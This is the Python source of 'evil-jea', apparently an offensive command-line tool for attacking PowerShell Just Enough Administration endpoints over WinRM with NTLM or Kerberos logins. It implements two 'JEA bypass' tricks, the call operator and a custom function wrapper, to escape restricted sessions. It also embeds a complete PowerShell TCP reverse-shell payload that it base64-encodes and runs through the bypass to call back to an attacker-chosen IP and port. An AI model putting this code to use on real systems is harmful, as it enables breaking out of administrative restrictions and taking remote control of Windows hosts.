#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
This is the entry point for the command-line interface (CLI) application.

.. currentmodule:: evil_jea.cli
.. moduleauthor:: Sasha Thomas
"""
import logging
import click
import re
import base64
import os
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from .__init__ import __version__

LOGGING_LEVELS = {
    0: logging.NOTSET,
    1: logging.ERROR,
    2: logging.WARN,
    3: logging.INFO,
    4: logging.DEBUG,
}  #: a mapping of `verbose` option counts to logging levels


class Info(object):
    """An information object to pass data between CLI functions."""

    def __init__(self):  # Note: This object must have an empty constructor.
        """Create a new instance."""
        self.verbose: int = 0


# pass_info is a decorator for functions that pass 'Info' objects.
#: pylint: disable=invalid-name
pass_info = click.make_pass_decorator(Info, ensure=True)


# Change the options to below to suit the actual options for your task (or
# tasks).
@click.group()
@click.option("--verbose", "-v", count=True, help="Enable verbose output.")
@pass_info
def cli(info: Info, verbose: int, max_content_width=120):
    '''\b
___________     .__.__                 ____.___________   _____   
\_   _____/__  _|__|  |               |    |\_   _____/  /  _  \  
 |    __)_\  \/ /  |  |    ______     |    | |    __)_  /  /_\  \ 
 |        \\\   /|  |  |__ /_____/ /\__|    | |        \/    |    \\
/_______  / \_/ |__|____/         \________|/_______  /\____|__  /
        \/                                          \/         \/ 
                                                                                                                         
    '''
    # Use the verbosity count to determine the logging level...
    if verbose > 0:
        logging.basicConfig(
            level=LOGGING_LEVELS[verbose]
            if verbose in LOGGING_LEVELS
            else logging.DEBUG
        )
        click.echo(
            click.style(
                f"Verbose logging is enabled. "
                f"(LEVEL={logging.getLogger().getEffectiveLevel()})",
                fg="yellow",
            )
        )
    info.verbose = verbose

help_text = """
JEA Shell Commands:
    help                    Show list of available commands
    info [command]          Dump definitions for available commands. 
    call [command]          JEA bypass: Attempts to run [command] using call operator 
    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
    rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
"""

def create_wsman(target, username=None, password=None, use_kerberos=False, ccache_path=None, krb5_config=None):
    """
    Create a WSMan connection with support for multiple authentication methods.
    
    Args:
        target: Target hostname/IP
        username: Username for NTLM auth
        password: Password for NTLM auth
        use_kerberos: Enable Kerberos authentication
        ccache_path: Path to Kerberos ccache file
        krb5_config: Path to krb5.conf file
    
    Returns:
        WSMan object configured for the specified auth method
    """
    if use_kerberos:
        # Set up Kerberos environment
        if ccache_path:
            os.environ["KRB5CCNAME"] = ccache_path
        elif os.environ.get("KRB5CCNAME"):
            ccache_path = os.environ.get("KRB5CCNAME")
            click.echo(click.style(f"[*] Using existing KRB5CCNAME: {ccache_path}", fg="cyan"))
        
        if krb5_config:
            os.environ["KRB5_CONFIG"] = krb5_config
        elif os.path.exists("./krb5.conf"):
            os.environ["KRB5_CONFIG"] = "./krb5.conf"
            click.echo(click.style("[*] Using ./krb5.conf", fg="cyan"))
        
        # Validate ccache file exists
        if ccache_path and ccache_path.startswith('FILE:'):
            ccache_path = ccache_path[5:]
        
        if ccache_path and not os.path.exists(ccache_path):
            click.echo(click.style(f"[-] Warning: ccache file not found: {ccache_path}", fg="yellow"))
        
        click.echo(click.style("[+] Using Kerberos authentication", fg="green"))
        
        return WSMan(
            target,
            ssl=False,
            auth="kerberos",
            negotiate_service="HTTP",
            cert_validation=False
        )
    else:
        # Standard NTLM authentication
        click.echo(click.style("[+] Using NTLM authentication", fg="green"))
        return WSMan(
            target,
            username=username,
            password=password,
            ssl=False,
            auth="negotiate",
            cert_validation=False
        )

@cli.command()
@click.argument('username', required=False, default='')
@click.argument('password', required=False, default='')
@click.argument('target')
@click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
@click.option('--kerberos', '-k', is_flag=True, help="Use Kerberos authentication instead of NTLM")
@click.option('--ccache', '-c', help="Path to Kerberos ccache file (overrides KRB5CCNAME)")
@click.option('--krb5-config', help="Path to krb5.conf file (default: ./krb5.conf)")
def connect(username, password, target, raw, kerberos, ccache, krb5_config):
    """
    Connect to JEA target.
    
    Examples:
        evil-jea connect username password target
        evil-jea connect "" "" target --kerberos
        evil-jea connect "" "" target --kerberos --ccache /path/to/ticket.ccache
    
    \b
    JEA Shell Commands:
        help                    Show list of available commands
        info [command]          Dump definitions for available commands. 
        call [command]          JEA bypass: Attempts to run [command] using call operator 
        function [command]      JEA bypass: Attempts to run [command] inside of a custom function
        rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
    """
    commands = ["help", "call", "function", "info", "rev_shell"]
    
    # Create WSMan connection with appropriate auth
    if kerberos:
        if not username and not password:
            click.echo(click.style("[*] Kerberos mode: Empty credentials accepted", fg="cyan"))
        wsman = create_wsman(target, use_kerberos=True, ccache_path=ccache, krb5_config=krb5_config)
    else:
        if not username or not password:
            click.echo(click.style("[-] Error: Username and password required for NTLM authentication", fg="red"))
            click.echo(click.style("[*] Use --kerberos flag for ticket-based authentication", fg="yellow"))
            return
        wsman = create_wsman(target, username=username, password=password)

    print("[+] Testing connection...")
    try:
        test_output = run_command(wsman, "Get-Command", raw)
        if (test_output):
            print("[+] Connection succeeded. Available commands:")
            for result in test_output:
                print(result)
        else:
            print("[-] Something went wrong. Check your credentials or the target.")
            return
    except Exception as e:
        click.echo(click.style(f"[-] Connection failed: {str(e)}", fg="red"))
        return

    while True:
        try:
            command = input(f"[{target}]: PS> ")
            if not command:
                continue
            root_command = command.split()[0]
            if root_command in commands:
                match root_command:
                    case "help":
                        print(help_text)
                    case "info":
                        info(wsman, raw)
                    case "call":
                        try:
                            new = " ".join(command.split()[1:])
                            for result in call_bypass(wsman, new, raw):
                                print(result)
                        except Exception as e:
                            print(f"Something went wrong. Did you provide an argument to the call command? Error: {e}")
                    case "function":
                        try:
                            new = " ".join(command.split()[1:])
                            for result in function_bypass(wsman, new, raw):
                                print(result)
                        except Exception as e:
                            print(f"Something went wrong. Did you provide an argument to the function command? Error: {e}")
                    case "rev_shell":
                        try:
                            ip = command.split()[1]
                            port = command.split()[2]
                            reverse_shell(wsman, ip, port)
                        except Exception as e:
                            print(f"Something went wrong. Did you pass an IP and port to connect back to? Error: {e}")
                    case _:
                        print("JEA shell command not found!")
            else:
                result = run_command(wsman, command, raw)
                for output in result:
                    print(output)
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except EOFError:
            print("\n[!] Exiting...")
            break


@cli.command()
def version():
    """Get the library version."""
    click.echo(click.style(f"{__version__}", bold=True))

@cli.command()
@click.argument('username', required=False, default='')
@click.argument('password', required=False, default='')
@click.argument('target')
@click.option('--command', '-c', required=True, help="Command to run on the target")
@click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
@click.option('--kerberos', '-k', is_flag=True, help="Use Kerberos authentication instead of NTLM")
@click.option('--ccache', help="Path to Kerberos ccache file (overrides KRB5CCNAME)")
@click.option('--krb5-config', help="Path to krb5.conf file (default: ./krb5.conf)")
def run(username, password, target, command, raw, kerberos, ccache, krb5_config):
    """
    Run a single command on the JEA target.
    
    Examples:
        evil-jea run username password target -c "Get-Command"
        evil-jea run "" "" target --kerberos -c "whoami"
    """
    # Create WSMan connection with appropriate auth
    if kerberos:
        wsman = create_wsman(target, use_kerberos=True, ccache_path=ccache, krb5_config=krb5_config)
    else:
        if not username or not password:
            click.echo(click.style("[-] Error: Username and password required for NTLM authentication", fg="red"))
            click.echo(click.style("[*] Use --kerberos flag for ticket-based authentication", fg="yellow"))
            return
        wsman = create_wsman(target, username=username, password=password)
    
    try:
        result = run_command(wsman, command, raw)
        for output in result:
            print(output)
    except Exception as e:
        click.echo(click.style(f"[-] Command failed: {str(e)}", fg="red"))

@cli.command()
@click.argument('username', required=False, default='')
@click.argument('password', required=False, default='')
@click.argument('target')
@click.argument('lhost')
@click.argument('lport')
@click.option('--kerberos', '-k', is_flag=True, help="Use Kerberos authentication instead of NTLM")
@click.option('--ccache', help="Path to Kerberos ccache file (overrides KRB5CCNAME)")
@click.option('--krb5-config', help="Path to krb5.conf file (default: ./krb5.conf)")
def shell(username, password, target, lhost, lport, kerberos, ccache, krb5_config):
    """
    Attempts to run a reverse shell on the target using a call operator bypass.
    
    Examples:
        evil-jea shell username password target 10.10.10.10 4444
        evil-jea shell "" "" target 10.10.10.10 4444 --kerberos
    """
    # Create WSMan connection with appropriate auth
    if kerberos:
        wsman = create_wsman(target, use_kerberos=True, ccache_path=ccache, krb5_config=krb5_config)
    else:
        if not username or not password:
            click.echo(click.style("[-] Error: Username and password required for NTLM authentication", fg="red"))
            click.echo(click.style("[*] Use --kerberos flag for ticket-based authentication", fg="yellow"))
            return
        wsman = create_wsman(target, username=username, password=password)
    
    reverse_shell(wsman, lhost, lport)


def run_command(wsman, command, raw):
    commands = re.findall(r'(?:[^\s"]|"(?:\\.|[^"])*")+', command)
    # FIX: Always use the "restricted" configuration name for JEA
    with RunspacePool(wsman, configuration_name="restricted") as pool:
        ps = PowerShell(pool)
        if raw:
            ps.add_script(command)
        else:
            args = []
            params = []
            seen = False
            if len(commands) > 1:
                for cmd in commands[1:]:
                    if cmd.startswith("-"): 
                        params.append(cmd[1:])
                        seen = True
                        continue
                    else:
                        if seen:
                            params.append(cmd)
                            seen = False
                        else:
                            args.append(cmd)
                ps.add_cmdlet(commands[0])
                for arg in args:
                    ps.add_argument(args)
                for values in range(0, len(params), 2):
                    param, value = params[values:values + 2]
                    ps.add_parameter(param, value)
            else: 
                ps.add_cmdlet(command) 
        ps.invoke()
        return ps.output

def call_bypass(wsman, command, raw):
    result = run_command(wsman, "&{ " + command + " }", raw)
    return result

def function_bypass(wsman, command, raw):
    result = run_command(wsman, "function gl {" + command + "}; gl", raw)
    return result

def info(wsman, raw):
    result = run_command(wsman, 'Get-Command', raw)
    for output in result:
        print(f"Name: {output.adapted_properties.get('Name')}")
        print(f"Type: {output.adapted_properties.get('CommandType')}")
        print("==========================")
        print(output.adapted_properties.get('ScriptBlock'))
        
def reverse_shell(wsman, ip, port):
    shell = """
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        """
    formatted = shell.replace("{ip}", ip).replace("{port}", port)
    bytes = formatted.encode('utf-16-le')
    b64 = base64.b64encode(bytes)
    payload = f"powershell -e {b64.decode()}"
    print("Running reverse shell payload using call bypass, check your listener:")
    print(payload)
    call_bypass(wsman, payload, True)
